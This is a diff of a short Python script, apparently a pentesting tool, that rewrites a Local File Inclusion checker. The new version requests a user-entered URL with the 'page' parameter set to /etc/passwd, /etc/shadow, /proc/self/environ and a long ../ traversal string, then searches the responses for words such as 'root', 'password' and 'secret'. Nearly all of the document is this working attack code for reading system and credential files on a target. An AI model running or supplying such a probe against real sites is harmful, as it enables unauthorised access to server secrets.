@@ -1,40 +1,49 @@
-import requests, sys
+import requests
 
-"""
-	Local File Inclusion Vulnerability Checker
-		Released for pentesting
-"""
+class LFI_VulnerabilityChecker:
+    def __init__(self):
+        self.url = input("Target URL: ")
 
-class Main:
-	def __init__(self):
-		self.url = str(input("Target URL: ")) # Gets URL (target) as user input.
+    def check_vulnerability(self):
+        if "page=" in self.url:
+            print("\nTarget matches LFI parameters. Commencing request!")
+            self.send_request()
+        else:
+            print("\nTarget does not match LFI parameters. Please try again.")
+            return
 
-	def url_filter(self):
-		if "page=" in self.url: # Examine if the URL has valid parameters.
-			print("\nTarget Matches LFI parameters!\nCommencing Request!") # If valid parameters returns success to user and continues
-			self.send_request()
-		else:
-			sys.exit("Target Does Not Match LFI parameters!\nPlease try agian.") # If URL does not match the valid parameters gives error
+    def send_request(self):
+        payloads = [
+            "/etc/passwd",
+            "/etc/shadow",
+            "/proc/self/environ",
+            "../../../../../../../../../../../../../etc/passwd",
+        ]
 
-	def send_request(self):
-		self.mix = self.url.split("=") # Splits URL with the "="
-		self.output = requests.get(self.mix[0] + "=/etc/passwd") # Sends request, with changed url to check for the vulnerability
-		self.filter_output(self.output.text) # Filters Output
+        for payload in payloads:
+            response = requests.get(self.url, params={"page": payload})
+            self.filter_output(response.text, payload)
 
-	def filter_output(self, output):
-		if "/bin/" in output: # If "/bin/" in response continue
-			if "root" in output:
-				print("\nTarget is Vulnerable!\nWebserver is running on root.") # If "root" in response server is vulnerable and on root
-			else:
-				print("\nTarget is Vulnerable!") # If not "root" server is still vulnerable, just not on root
+    def filter_output(self, output, payload):
+        if "/bin/" in output or "/home/" in output:
+            print(f"\nTarget may be vulnerable! Payload: {payload}")
+            self.check_additional_signs(output)
+        else:
+            print(f"\nTarget is secure for payload: {payload}")
 
-		elif "/home/" in output: # If "/bin/" not found then look for "/home/"
-			print("Target is Vulnerable!") # If found return success
+    def check_additional_signs(self, output):
+        dangerous_signs = [
+            "root",
+            "admin",
+            "password",
+            "secret",
+            "database",
+        ]
 
-		else:
-			print("Target is secure and not vulnerable to L.F.I.") # If none were found return statement saying that target is secure
-
+        for sign in dangerous_signs:
+            if sign in output:
+                print(f"Potential dangerous sign found: {sign}")
 
 if __name__ == '__main__':
-	main = Main()
-	main.url_filter()
+    checker = LFI_VulnerabilityChecker()
+    checker.check_vulnerability()
